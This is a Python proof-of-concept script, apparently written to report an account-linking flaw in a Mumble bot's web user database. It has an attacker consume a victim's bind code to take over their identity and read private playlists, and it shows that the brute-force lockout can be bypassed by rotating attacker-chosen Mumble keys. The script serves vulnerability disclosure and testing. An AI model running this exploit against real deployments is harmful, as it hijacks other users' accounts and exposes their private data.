import os, sys, tempfile, time
sys.path.insert(0, os.getcwd())
from web_users import UserDatabase

db = UserDatabase(os.path.join(tempfile.mkdtemp(), 'settings.db'))

# --- Victim (a legitimate web user, identity = their Cloudflare email) asks
#     the web UI for a bind code so they can link their OWN Mumble account.
victim = 'victim@example.com'
# give the victim a private playlist
pid = db.create_playlist(victim, 'My Private List')
db.add_items(victim, pid, [{'item_id': 'abc', 'type': 'url', 'ref': 'http://x',
                            'title': 'secret song', 'duration': 10}])
code, exp = db.create_bind_code(victim)
print('1) victim bind code:', code, '(6 digits, space = 1,000,000; TTL=600s)')

# --- Attacker is any Mumble user. If they submit the victim's code via !bind
#     BEFORE the victim does, consume_bind_code links the ATTACKER's mumble
#     account to the victim's web identity.
attacker_mumble_key = 'cert:ATTACKER_CERT_HASH'
ident = db.consume_bind_code(code, attacker_mumble_key, 'mallory')
print('2) attacker consumed victim code -> bound identity:', ident)

# --- Now the attacker's Mumble account resolves to the victim's web identity,
#     so chat commands (!mylist / !fav) operate on the VICTIM's playlists.
resolved = db.identity_for_mumble(attacker_mumble_key)
print('3) attacker mumble_key now maps to web identity:', resolved)
print('   attacker can read victim playlists via chat:',
      [p['name'] for p in db.list_playlists(resolved)])

# --- The only brute-force brake is commands/personal.py _locked():
#     MAX_FAILURES=5 per LOCKOUT_SECONDS, keyed on mumble_key. But an
#     unregistered Mumble user's key is cert:<hash> or name:<name> -- fully
#     attacker-chosen. Reconnecting / renaming yields a fresh key => the
#     5-attempt lockout resets, so guesses are effectively unlimited.
from commands import personal
now = time.time()
k = 'name:bot0'
for i in range(5):
    personal._failures.setdefault(k, []).append(now)
print('4) after 5 fails key %r locked? %s' % (k, personal._locked(k, now)))
print('   attacker rotates to a new name/cert -> key %r locked? %s (lockout bypassed)'
      % ('name:bot1', personal._locked('name:bot1', now)))
